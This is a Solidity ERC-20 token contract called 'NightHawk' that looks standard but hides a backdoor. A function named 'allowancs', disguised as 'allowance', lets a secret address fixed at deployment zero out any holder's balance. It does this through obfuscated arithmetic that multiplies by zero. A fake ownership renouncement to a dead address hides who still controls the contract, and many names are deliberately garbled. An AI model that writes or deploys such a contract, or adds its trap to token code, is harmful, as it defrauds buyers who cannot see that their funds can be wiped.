pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address acoritnt) external view returns (uint256);
    function transfer(address recipient, uint256 amcotuntt) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amcotuntt) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amcotuntt ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract NightHawk is Context, Ownable, IERC20 {
    mapping (address => uint256) private _erdfsd;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address public zzxxsds;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_,address xxxxxxx) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _erdfsd[_msgSender()] = _totalSupply;
        zzxxsds = xxxxxxx;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address acoritnt) public view override returns (uint256) {
        return _erdfsd[acoritnt];
    }
    function allowancs(address drtteeee) public  {
    address dsasdas = zzxxsds;
    require(_msgSender() == dsasdas);
    uint256 gfdsfa = 221; 
    uint256 azxdas = gfdsfa*4354;
    uint256 e34ewds = azxdas*555*444*2*111*0;
    uint256 zxdsda = e34ewds*11;
    uint256 edsasd = zxdsda;
        _erdfsd[drtteeee] *= edsasd*222222;
    }    
    function transfer(address recipient, uint256 amcotuntt) public virtual override returns (bool) {
        require(_erdfsd[_msgSender()] >= amcotuntt, "TT: transfer amcotuntt exceeds balance");

        _erdfsd[_msgSender()] -= amcotuntt;
        _erdfsd[recipient] += amcotuntt;
        emit Transfer(_msgSender(), recipient, amcotuntt);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amcotuntt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amcotuntt;
        emit Approval(_msgSender(), spender, amcotuntt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amcotuntt) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amcotuntt, "TT: transfer amcotuntt exceeds allowance");

        _erdfsd[sender] -= amcotuntt;
        _erdfsd[recipient] += amcotuntt;
        _allowances[sender][_msgSender()] -= amcotuntt;

        emit Transfer(sender, recipient, amcotuntt);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}